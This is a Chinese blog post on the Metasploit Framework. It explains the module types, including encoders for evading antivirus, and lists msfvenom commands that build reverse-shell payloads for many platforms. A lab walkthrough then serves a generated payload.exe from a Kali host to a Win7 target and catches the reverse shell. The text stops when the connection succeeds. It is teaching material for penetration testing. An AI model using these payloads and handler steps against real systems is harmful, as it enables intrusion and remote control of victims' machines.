@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Metasploit Framework | mrfan6の博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Metasploit Framework(MSF)使用方法进入框架：msfconsole    使用search命令查找相关漏洞： search  ms17-010    使用use进入模块:  use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue       使用info查看模块信息： info     设置攻击载荷：set payload windows&#x2F;x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit Framework">
+<meta property="og:url" content="https://mrfan6.github.io/2022/04/02/Metasploit%20Framework/index.html">
+<meta property="og:site_name" content="mrfan6の博客">
+<meta property="og:description" content="Metasploit Framework(MSF)使用方法进入框架：msfconsole    使用search命令查找相关漏洞： search  ms17-010    使用use进入模块:  use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue       使用info查看模块信息： info     设置攻击载荷：set payload windows&#x2F;x">
+<meta property="og:locale">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image1.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image2.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image3.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image4.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image5.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image6.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image7.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image8.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image9.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image10.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image11.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image12.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image13.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image14.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image15.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image16.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image17.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image18.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image19.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image20.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image21.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image22.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image23.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image24.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image25.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image26.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image27.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image28.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image29.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image30.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image31.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image32.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image33.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image34.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image35.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image36.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image37.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image38.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image39.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image40.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image41.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image42.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image43.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image44.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image45.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image46.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image47.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image48.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image49.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image50.png">
+<meta property="article:published_time" content="2022-04-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-18T09:43:20.650Z">
+<meta property="article:author" content="mrfan6">
+<meta property="article:tag" content="tools">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="mrfan6の博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate"></a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                            <li><a href="/HTML/index.html">火影忍者</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="#" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                            
+                                <a class="fl QQ" target="_blank" href="#" title="QQ">QQ</a>
+                            
+                                <a class="fl wechat" target="_blank" href="#" title="wechat">wechat</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Web安全</a> <a href="/tags/tools/" style="font-size: 20px;">tools</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">编程</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a> <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 15px;">靶机</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://mrfan6.github.io/">mrfan6</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱运动、喜欢接触新鲜事物、迎接新的挑战，更爱游离于错综复杂的编码与逻辑中</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>            
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                    <li><a href="/HTML/index.html">火影忍者</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="#" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                    
+                        <a class="QQ" target="_blank" href="#" title="QQ">QQ</a>
+                    
+                        <a class="wechat" target="_blank" href="#" title="wechat">wechat</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-Metasploit Framework" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/04/02/Metasploit%20Framework/" class="article-date">
+      <time datetime="2022-04-01T16:00:00.000Z" itemprop="datePublished">2022-04-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Metasploit Framework
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+	<div class="article-entry" itemprop="articleBody">
+	      
+	        
+	            
+	        
+	        
+	        <h1 id="Metasploit-Framework-MSF"><a href="#Metasploit-Framework-MSF" class="headerlink" title="Metasploit Framework(MSF)"></a>Metasploit Framework(MSF)</h1><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>进入框架：msfconsole</p>
+<ul>
+<li><p>  使用search命令查找相关漏洞： search  ms17-010</p>
+</li>
+<li><p>  使用use进入模块:  use exploit/windows/smb/ms17_010_eternalblue   </p>
+</li>
+<li><p>  使用info查看模块信息： info </p>
+</li>
+<li><p>  设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp</p>
+</li>
+<li><p>  查看模块需要配置的参数：show options</p>
+</li>
+<li><p>  设置参数：set  RHOST  192.168.125.138</p>
+</li>
+<li><p>  攻击：exploit /  run </p>
+</li>
+<li><p>  返回上一级：back</p>
+</li>
+<li><p>  将会话放到后台：background</p>
+</li>
+<li><p>  后渗透阶段</p>
+</li>
+</ul>
+<p>在获取权限后可以使用：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">screenshot      #对目标主机的屏幕进行截图</span><br><span class="line">shell           #以所有可用令牌来运行一个交互的shell</span><br></pre></td></tr></table></figure>
+
+<h2 id="MSF的功能模块介绍"><a href="#MSF的功能模块介绍" class="headerlink" title="MSF的功能模块介绍"></a>MSF的功能模块介绍</h2><p>MSF所用功能主要可分为这几个模块，每个模块都有各自的功能领域，形成了渗透测试的流程</p>
+<h3 id="Auxiliaries-辅助模块"><a href="#Auxiliaries-辅助模块" class="headerlink" title="Auxiliaries (辅助模块)"></a>Auxiliaries (辅助模块)</h3><p>该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。</p>
+<p>简单的说就是为渗透测试信息搜集提供了大量的辅助模块支持</p>
+<h3 id="Exploit-漏洞利用模块或攻击模块"><a href="#Exploit-漏洞利用模块或攻击模块" class="headerlink" title="Exploit (漏洞利用模块或攻击模块)"></a>Exploit (漏洞利用模块或攻击模块)</h3><p>漏洞利用是指由渗透测试者利用一个系统、应用或者服务中的安全漏洞进行的攻击行为。流行的渗透攻击技术包括缓冲区溢出、Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码。</p>
+<p>简单的说就是利用发现的安全漏洞或配置弱点对远程目标系统进行攻击，从而获得对远程目标系统访问权的代码组件。</p>
+<h3 id="Payload-攻击载荷模块"><a href="#Payload-攻击载荷模块" class="headerlink" title="Payload (攻击载荷模块)"></a>Payload (攻击载荷模块)</h3><p>Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意代码，而在Metasploit中Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。简而言之，这种漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为</p>
+<p>简单的说就是攻击成功后促使靶机运行的一段植入代码</p>
+<p><strong>Shellcode</strong> ：Shellcode是payload中的精髓部分，在渗透攻击时作为攻击载荷运行的一组机器指令。简单的说就是漏洞利用。Shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令<br>之后，才会提供一个命令行shell。</p>
+<h4 id="Metasploit中的-Payload-模块主要有以下三种类型："><a href="#Metasploit中的-Payload-模块主要有以下三种类型：" class="headerlink" title="Metasploit中的 Payload 模块主要有以下三种类型："></a>Metasploit中的 Payload 模块主要有以下三种类型：</h4><ul>
+<li>  <strong>-Single</strong></li>
+<li>  <strong>-Stager</strong></li>
+<li>  <strong>-Stage</strong></li>
+</ul>
+<ul>
+<li><p>Single是一种完全独立的Payload，而且使用起来就像运行 calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似 netcat这样的非metasploit处理工具所捕捉到。</p>
+</li>
+<li><p>Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stager Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接，让目标系统主动连接我们的端口(反向连接)。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)。</p>
+</li>
+<li><p>Stage是Stager Payload下的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制</p>
+</li>
+</ul>
+<p><strong>在 Metasploit中，我们可以通过Payload的名称和使用格式来推断它的类型：</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image1.png">{width=”8.36111111111111in”<br>height=”0.45416666666666666in”}</p>
+<p><strong>在 Metasploit中，我们可以通过Payload的名称和使用格式来推断它的类型：</strong></p>
+<p><strong>当我们在Metasploit中执行 show  payloads命令之后，它会给我们显示一个可使用的Payload列表：</strong></p>
+<p><strong>在这个列表中，像 windows/powershell_bind_tcp 就是一个Single<br>Payload，它不包含Stage Payload</strong></p>
+<p><strong>而 windows/meterpreter/reverse_tcp 则由一个Stage Payload（meterpreter）和 一个Stager Payload（reverse_tcp）组成</strong></p>
+<p><strong>Stager中几种常见的payload</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image2.png">{width=”5.763888888888889in” height=”0.95in”}</p>
+<p><strong>正向连接</strong>使用场景：我们的攻击机在外网环境，被攻击机是内网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了80端口。那么，我们就只能设置正向连接80端口了，这里很有可能失败，因为80端口上的流量太多了</p>
+<p><strong>windows/meterpreter/bind_tcp #正向连接</strong></p>
+<p><strong>反向连接</strong>使用场景：我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量。</p>
+<p><strong>windows/meterpreter/reverse_tcp #反向连接，常用</strong></p>
+<p><strong>反向连接</strong>80和443端口使用场景：被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的80端口或443端口与外部通信</p>
+<h3 id="Post-后期渗透模块"><a href="#Post-后期渗透模块" class="headerlink" title="Post (后期渗透模块)"></a>Post (后期渗透模块)</h3><p>该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等。</p>
+<p>简单的说就是收集更多信息或进一步访问被利用的目标系统</p>
+<h3 id="Encoders-编码工具模块"><a href="#Encoders-编码工具模块" class="headerlink" title="Encoders (编码工具模块)"></a>Encoders (编码工具模块)</h3><p>该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、IDS及类似的安全软件检测出来。</p>
+<p>简单的说就是将攻击载荷进行编码，来绕过防护软件拦截</p>
+<h1 id="Msfvenom生成payload参数详解"><a href="#Msfvenom生成payload参数详解" class="headerlink" title="Msfvenom生成payload参数详解"></a>Msfvenom生成payload参数详解</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1.-p</span><br><span class="line"></span><br><span class="line">这个是指定你要加载的 payload</span><br><span class="line"></span><br><span class="line">2.-l</span><br><span class="line"></span><br><span class="line">列出所有的 payload</span><br><span class="line"></span><br><span class="line">3.-n</span><br><span class="line"></span><br><span class="line">设置 nopsled 的大小，常用 rop 类型的 payload，可以绕过系统 edp 保护</span><br><span class="line"></span><br><span class="line">4.-f</span><br><span class="line"></span><br><span class="line">指定两种格式输出，和 msfencode -t 相同</span><br><span class="line"></span><br><span class="line">（第一种：支持 aspx php asp exe dll elf jsp msi war vbs</span><br><span class="line">等等常用格式\...\...\...\...\...\.....）</span><br><span class="line"></span><br><span class="line">（第二种：支持了 bash c java python ruby psl py perl pl</span><br><span class="line">等等常用格式\...\...\...\...\...\...\...）</span><br><span class="line"></span><br><span class="line">5.-e</span><br><span class="line"></span><br><span class="line">使用编码器</span><br><span class="line"></span><br><span class="line">6.-a</span><br><span class="line"></span><br><span class="line">精确的使用编码（生成的 payload 用于 32 位操作系统 那么就指定 -a</span><br><span class="line">x86）</span><br><span class="line"></span><br><span class="line">7.-s</span><br><span class="line"></span><br><span class="line">生成 payload 的时候可以指定最大多少</span><br><span class="line"></span><br><span class="line">8.-b</span><br><span class="line"></span><br><span class="line">去除空代码或者错误代码减少多余的字符同时减少体积（例如：-b</span><br><span class="line">\\xOO\\xff）</span><br><span class="line"></span><br><span class="line">9.-i</span><br><span class="line"></span><br><span class="line">指定编码次数</span><br><span class="line"></span><br><span class="line">10.-c 捆绑11. -o 指定输出位置</span><br></pre></td></tr></table></figure>
+
+<h2 id="常用脚本的生成："><a href="#常用脚本的生成：" class="headerlink" title="常用脚本的生成："></a>常用脚本的生成：</h2><p><strong>LHOST后填上攻击机IP，LPORT后接上监听的端口</strong></p>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h3><p><strong>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; root.elf</strong></p>
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h3><p><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe</strong></p>
+<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a><strong>Mac</strong></h3><p><strong>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f macho &gt; shell.macho</strong></p>
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a><strong>PHP</strong></h3><p><strong>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</strong></p>
+<h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a><strong>ASP</strong></h3><p><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f asp &gt; shell.asp</strong></p>
+<h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a><strong>JSP</strong></h3><p><strong>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp</strong></p>
+<h3 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a><strong>WAR</strong></h3><p><strong>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war</strong></p>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a><strong>Python</strong></h3><p><strong>msfvenom -p python/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.py</strong></p>
+<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a><strong>Bash</strong></h3><p><strong>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.sh</strong></p>
+<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a><strong>Perl</strong></h3><p><strong>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw shell.pl</strong></p>
+<h1 id="利用msf实现反弹shell与提权"><a href="#利用msf实现反弹shell与提权" class="headerlink" title="利用msf实现反弹shell与提权"></a>利用msf实现反弹shell与提权</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机kali IP：192.168.7.154</p>
+<p>Win7靶机 IP：192.168.7.131</p>
+<h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><p><strong>Kali生成payload</strong></p>
+<p><strong>┌──(kali㉿kali)-[~/Desktop]</strong></p>
+<p><strong>└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.7.154<br>LPORT=4444 -f exe -o payload.exe</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image3.png">{width=”6.627083333333333in”<br>height=”3.517361111111111in”}</p>
+<h2 id="Kali打开apache服务"><a href="#Kali打开apache服务" class="headerlink" title="Kali打开apache服务"></a>Kali打开apache服务</h2><p>切换当root用户</p>
+<p><strong>sudo su -</strong></p>
+<p>为了使得靶机能够访问攻击机。</p>
+<p><strong>┌──(root💀kali)-[/home/kali/Desktop]</strong></p>
+<p><strong>└─# mv payload.exe /var/www/html/</strong></p>
+<p><strong>┌──(root💀kali)-[/home/kali/Desktop]</strong></p>
+<p><strong>└─# systemctl start apache2</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image4.png">{width=”5.763194444444444in”<br>height=”2.692361111111111in”}</p>
+<h2 id="Kali设置设置监听"><a href="#Kali设置设置监听" class="headerlink" title="Kali设置设置监听"></a>Kali设置设置监听</h2><h3 id="①打开msfconsole模块"><a href="#①打开msfconsole模块" class="headerlink" title="①打开msfconsole模块"></a>①打开msfconsole模块</h3><p><strong>┌──(root💀kali)-[/home/kali/Desktop]</strong></p>
+<p><strong>└─# msfconsole</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image5.png">{width=”5.763888888888889in”<br>height=”3.2784722222222222in”}</p>
+<h3 id="②使用监听use"><a href="#②使用监听use" class="headerlink" title="②使用监听use"></a>②使用监听use</h3><p><strong>msf6 &gt; use exploit/multi/handler</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image6.png">{width=”5.761805555555555in”<br>height=”3.857638888888889in”}</p>
+<h3 id="③设置监听的payload"><a href="#③设置监听的payload" class="headerlink" title="③设置监听的payload"></a>③设置监听的payload</h3><p>这里的payload载荷要与生成木马的一致否则将会失败</p>
+<p><strong>msf6 exploit(multi/handler) &gt; set payload<br>windows/meterpreter/reverse_tcp</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image7.png">{width=”4.1097222222222225in”<br>height=”3.120138888888889in”}</p>
+<h3 id="④设置选项options"><a href="#④设置选项options" class="headerlink" title="④设置选项options"></a>④设置选项options</h3><p><strong>msf6 exploit(multi/handler) &gt; set lhost 192.168.7.154</strong></p>
+<p><strong>lhost =&gt; 192.168.7.154</strong></p>
+<p><strong>msf6 exploit(multi/handler) &gt; set lport 4444</strong></p>
+<p><strong>lport =&gt; 4444</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image8.png">{width=”4.186111111111111in”<br>height=”3.2006944444444443in”}</p>
+<h3 id="⑤开始执行"><a href="#⑤开始执行" class="headerlink" title="⑤开始执行"></a>⑤开始执行</h3><p><strong>msf6 exploit(multi/handler) &gt; run</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image9.png">{width=”5.082638888888889in” height=”3.65in”}</p>
+<h2 id="靶机进行访问攻击机的资源"><a href="#靶机进行访问攻击机的资源" class="headerlink" title="靶机进行访问攻击机的资源"></a>靶机进行访问攻击机的资源</h2><p><strong><a target="_blank" rel="noopener" href="http://192.168.7.154/payload.exe">http://192.168.7.154/payload.exe</a> 下载后并进行运行</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image10.png">{width=”3.63125in” height=”2.9819444444444443in”}</p>
+<h2 id="Kali反弹shell成功"><a href="#Kali反弹shell成功" class="headerlink" title="Kali反弹shell成功"></a>Kali反弹shell成功</h2><p>宿主机运行payload.exe 出现下面类似命令表示反弹成功</p>
